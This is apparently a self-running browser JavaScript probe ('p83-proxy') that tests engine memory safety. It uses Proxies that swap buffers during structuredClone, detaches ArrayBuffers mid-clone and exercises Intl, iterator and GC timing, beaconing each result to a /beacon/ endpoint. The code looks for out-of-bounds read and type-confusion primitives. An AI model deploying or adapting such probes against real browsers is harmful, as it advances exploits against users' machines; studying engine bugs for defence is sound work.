/* p83-proxy — structuredClone with mutating Proxy
 *
 * The clone algorithm reads properties from the source object.
 * If the source is a Proxy, every read fires the handler.
 * If the handler returns DIFFERENT values on repeated reads,
 * the serializer might snapshot metadata from one object
 * but copy data from another.
 *
 * Also: Intl, JSON.parse reviver, iterator protocol confusion,
 * WeakRef/FinalizationRegistry timing, Promise microtask races.
 *
 * Beacon prefix: V83P-
 */
(function(){
"use strict";
var RUN_ID = "v83p" + Math.random().toString(36).slice(2,12);
var PREFIX = "V83P-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press83-proxy confusion");

/* ====== P1: structuredClone with mutating Proxy ====== */
function test_P1() {
  var r = {};
  try {
    var smallBuf = new ArrayBuffer(16);
    var smallView = new Uint8Array(smallBuf);
    for (var i = 0; i < 16; i++) smallView[i] = 0xAA;

    var bigBuf = new ArrayBuffer(4096);
    var bigView = new Uint8Array(bigBuf);
    for (var j = 0; j < 4096; j++) bigView[j] = 0xBB;

    var readCount = 0;
    var proxy = new Proxy({}, {
      get: function(target, prop) {
        readCount++;
        // First read: return big buffer (serializer snapshots 4096 bytes)
        // Second read: return small buffer (serializer copies from 16-byte buf)
        // If serializer reads size from big but copies from small → OOB read
        if (prop === 'buf') {
          if (readCount <= 2) return bigBuf;
          return smallBuf; // swap on later read
        }
        return undefined;
      },
      ownKeys: function() { return ['buf']; },
      getOwnPropertyDescriptor: function(target, prop) {
        if (prop === 'buf') return { value: bigBuf, writable: true, enumerable: true, configurable: true };
        return undefined;
      }
    });

    try {
      var cloned = structuredClone(proxy);
      r.clonedKeys = Object.keys(cloned);
      if (cloned.buf) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte15 = cv[15];
        if (cv.length > 16) r.byte20 = cv[20];
        // If byte0=0xAA (from small) but bufLen=4096 (from big) → confusion!
        r.CONFUSED = cloned.buf.byteLength === 4096 && cv[0] === 0xAA;
        // If byte0=0xBB but some bytes are 0xAA → partial confusion
        var aaCount = 0, bbCount = 0;
        for (var k = 0; k < cv.length; k++) {
          if (cv[k] === 0xAA) aaCount++;
          else if (cv[k] === 0xBB) bbCount++;
        }
        r.aaCount = aaCount;
        r.bbCount = bbCount;
      }
      r.readCount = readCount;
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,60);
      r.readCount = readCount;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P1-MUTATE-PROXY", r);
}

/* ====== P2: Clone with type-switching Proxy ====== */
function test_P2() {
  var r = {};
  try {
    var readCount = 0;
    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = i;

    // Object that changes type between reads
    var proxy = new Proxy({}, {
      get: function(target, prop) {
        readCount++;
        if (prop === 'data') {
          // First: return ArrayBuffer
          // Later: return a plain object (different serialization path!)
          if (readCount <= 1) return ab;
          return { length: 999, 0: "surprise" };
        }
        if (prop === Symbol.toStringTag) return "Object";
        return undefined;
      },
      ownKeys: function() { return ['data']; },
      getOwnPropertyDescriptor: function(target, prop) {
        return { value: ab, writable: true, enumerable: true, configurable: true };
      }
    });

    try {
      var cloned = structuredClone(proxy);
      r.readCount = readCount;
      r.hasData = 'data' in cloned;
      if (cloned.data instanceof ArrayBuffer) {
        r.dataType = "ArrayBuffer";
        r.dataLen = cloned.data.byteLength;
      } else {
        r.dataType = typeof cloned.data;
        r.dataKeys = Object.keys(cloned.data).join(",");
      }
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,60);
      r.readCount = readCount;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P2-TYPE-SWITCH", r);
}

/* ====== P3: Clone with self-referencing Proxy that detaches ====== */
function test_P3() {
  var r = {};
  try {
    var ab = new ArrayBuffer(1024);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 1024; i++) u8[i] = 0xCC;

    var detached = false;
    var obj = {};
    obj.buf = ab;
    Object.defineProperty(obj, 'trigger', {
      enumerable: true,
      get: function() {
        // Detach the buffer DURING clone property enumeration
        if (!detached) {
          detached = true;
          try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
        }
        return 42;
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      r.origDetached = ab.byteLength === 0;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte500 = cv.length > 500 ? cv[500] : -1;
        r.DETACH_CLONE = cloned.buf.byteLength === 1024 && cv[0] === 0xCC;
      }
      r.trigger = cloned.trigger;
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,60);
      r.detached = detached;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P3-DETACH-CLONE", r);
}

/* ====== P4: JSON.parse reviver + buffer manipulation ====== */
function test_P4() {
  var r = {};
  try {
    // JSON.parse reviver fires per key-value pair during parse
    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = 0xDD;

    var reviverCalls = 0;
    var json = '{"a":1,"b":2,"c":3,"d":4,"e":5}';
    var detached = false;

    var parsed = JSON.parse(json, function(key, value) {
      reviverCalls++;
      if (key === 'c' && !detached) {
        // Detach our buffer during JSON parse
        try {
          structuredClone(ab, { transfer: [ab] });
          detached = true;
        } catch(e) {}
      }
      return value;
    });

    r.reviverCalls = reviverCalls;
    r.detached = detached;
    r.parsed = JSON.stringify(parsed);
    // JSON.parse itself isn't affected, but this tests the pattern

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P4-JSON-REVIVER", r);
}

/* ====== P5: Intl.Segmenter with long string + callback ====== */
function test_P5() {
  var r = {};
  try {
    r.hasSegmenter = typeof Intl.Segmenter !== 'undefined';

    if (r.hasSegmenter) {
      var seg = new Intl.Segmenter('en', { granularity: 'word' });
      var longStr = 'hello world '.repeat(1000);
      var segments = seg.segment(longStr);
      var count = 0;
      for (var s of segments) {
        count++;
        if (count > 10000) break;
      }
      r.segCount = count;
    }

    // Intl.NumberFormat with extreme values
    try {
      var nf = new Intl.NumberFormat('en', {
        style: 'currency',
        currency: 'USD',
        minimumFractionDigits: 100, // extreme
        maximumFractionDigits: 100
      });
      r.extremeFormat = nf.format(Math.PI).length;
    } catch(e) {
      r.nfErr = e.message.slice(0,40);
    }

    // Intl.DateTimeFormat with all options
    try {
      var df = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', {
        era: 'long', year: 'numeric', month: 'long', day: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        timeZoneName: 'long'
      });
      r.dateFormat = df.format(new Date()).length;
    } catch(e) {
      r.dfErr = e.message.slice(0,40);
    }

    // Collator with extreme options
    try {
      var col = new Intl.Collator('zh-Hans', { sensitivity: 'variant' });
      r.collateResult = col.compare('ä', 'a');
    } catch(e) {
      r.colErr = e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P5-INTL", r);
}

/* ====== P6: Iterator protocol confusion ====== */
function test_P6() {
  var r = {};
  try {
    // Object with [Symbol.iterator] that changes behavior
    var iterCount = 0;
    var evil = {
      [Symbol.iterator]: function() {
        return {
          next: function() {
            iterCount++;
            if (iterCount <= 5) return { value: iterCount, done: false };
            if (iterCount === 6) return { value: undefined, done: true };
            // After "done", keep returning values (violation of protocol)
            return { value: 999, done: false };
          }
        };
      },
      length: 1000 // misleading length
    };

    // Array.from with evil iterator
    try {
      var arr = Array.from(evil);
      r.arrLen = arr.length;
      r.arrVals = arr.join(",");
    } catch(e) {
      r.fromErr = e.message.slice(0,40);
    }

    // Spread operator
    iterCount = 0;
    try {
      var spread = [...evil];
      r.spreadLen = spread.length;
    } catch(e) {
      r.spreadErr = e.message.slice(0,40);
    }

    // structuredClone of iterable
    iterCount = 0;
    try {
      var set = new Set(evil);
      var cloned = structuredClone(set);
      r.setSize = cloned.size;
    } catch(e) {
      r.setErr = e.message.slice(0,40);
    }

    r.iterCount = iterCount;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("P6-ITERATOR", r);
}

/* ====== P7: WeakRef + FinalizationRegistry timing ====== */
function test_P7() {
  var r = {};
  try {
    r.hasWeakRef = typeof WeakRef !== 'undefined';
    r.hasFinReg = typeof FinalizationRegistry !== 'undefined';

    if (r.hasFinReg) {
      var cleanupCalled = false;
      var cleanupValue = null;
      var registry = new FinalizationRegistry(function(heldValue) {
        cleanupCalled = true;
        cleanupValue = heldValue;
      });

      // Create object, register it, then let it be GC'd
      (function() {
        var obj = { data: new ArrayBuffer(1024) };
        registry.register(obj, "cleanup-marker");
        // obj goes out of scope
      })();

      // Try to force GC
      var garbage = [];
      for (var i = 0; i < 100000; i++) garbage.push({ x: new ArrayBuffer(256) });
      garbage = null;

      // Check after a delay
      setTimeout(function() {
        r.cleanupCalled = cleanupCalled;
        r.cleanupValue = cleanupValue;
        B("P7-WEAKREF", r);
      }, 500);

    } else {
      B("P7-WEAKREF", r);
    }

  } catch(e) { r.err = e.message.slice(0,80); B("P7-WEAKREF", r); }
}

/* ====== P8: Promise microtask queue manipulation ====== */
function test_P8() {
  var r = {};
  try {
    // Can we use microtask queue to interleave operations?
    var order = [];

    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = 0xEE;

    // Queue microtasks that detach buffer
    Promise.resolve().then(function() {
      order.push("micro1");
      try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
    });

    Promise.resolve().then(function() {
      order.push("micro2");
      r.bufAfterMicro = ab.byteLength;
    });

    // Synchronous operation that uses the buffer
    order.push("sync1");
    var sum = 0;
    for (var j = 0; j < u8.length; j++) sum += u8[j];
    order.push("sync2:sum=" + sum);

    // Microtasks execute after all synchronous code
    setTimeout(function() {
      r.order = order.join("|");
      r.MICROTASK_RACE = false; // microtasks are after sync, no real race
      B("P8-MICROTASK", r);
    }, 100);

  } catch(e) { r.err = e.message.slice(0,80); B("P8-MICROTASK", r); }
}

/* ====== Run ====== */
try {
  test_P1();
  setTimeout(test_P2, 200);
  setTimeout(test_P3, 400);
  setTimeout(test_P4, 600);
  setTimeout(test_P5, 800);
  setTimeout(test_P6, 1000);
  setTimeout(test_P7, 1200);
  setTimeout(test_P8, 1800);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2500);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe83-done"); }, 20000);
})();
